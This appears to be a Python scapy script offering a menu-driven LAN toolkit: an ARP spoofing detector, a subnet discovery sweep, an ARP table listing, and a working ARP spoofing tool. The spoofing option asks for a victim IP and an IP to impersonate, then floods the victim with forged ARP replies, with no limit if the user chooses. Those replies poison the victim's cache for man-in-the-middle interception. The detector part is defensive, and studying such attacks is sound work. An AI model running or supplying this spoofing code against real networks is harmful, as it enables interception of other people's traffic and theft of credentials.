from scapy.all import *
import os

def banner(message):
	symbol = len(message) * '#'
	print(f"""

##{symbol}##
# {message} #
##{symbol}##

""")

def check_arp(pckt):
	if pckt[ARP].op == 2:
		real_mac = getmacbyip(pckt.psrc)
		if real_mac != pckt.hwsrc and real_mac != "ff:ff:ff:ff:ff:ff":
			return "\033[1;31m ARP Spoofing Detected \033[0;0m"

def arp_spoofing_detector():
	banner("Arp Spoofing Detector")
	sniff(count=0, filter="arp", store=0, prn=check_arp)

def arp_spoofing():
	banner("Arp Spoofing")
	ip1 = input("Target to attack: ")
	ip2 = input("Target to supplant: ")
	npackets =int(input("Nº Packets (0 Unlimited): "))
	if npackets == 0: npackets = None
	mac1 = getmacbyip(ip1)
	sendp(Ether(dst=mac1)/ARP(op=2, psrc=ip2, pdst=ip1),inter=0.2, loop=1, count = npackets )

def netdiscover():
	banner("Discover Net")
	ip = input("Target (192.168.1.0/24): ")
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2)
	ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%") )

def menu():
	banner("Main Menu")
	print("""[1] Arp Spoofing Detector
[2] Arp Spoofing Tool
[3] Discover Net
[4] List Arp Table
[0] Exit

""")
	option = input("Select an option: ")
	return option


def main():
	option = menu()
	if option == '1':
		arp_spoofing_detector()
		main()
	elif option == '2':
		arp_spoofing()
		main()
	elif option == '3':
		netdiscover()
		main()
	elif option == '4':
		banner("ARP Table")
		os.system("arp -a")
		print("\n")
		main()
	elif option == '0':
		sys.exit("Exit")
	else:
		print('\n\033[1;31m' + "Option unavailable" + '\033[0;0m')
		main()

if __name__ == '__main__':
         os.system('clear')
         main()

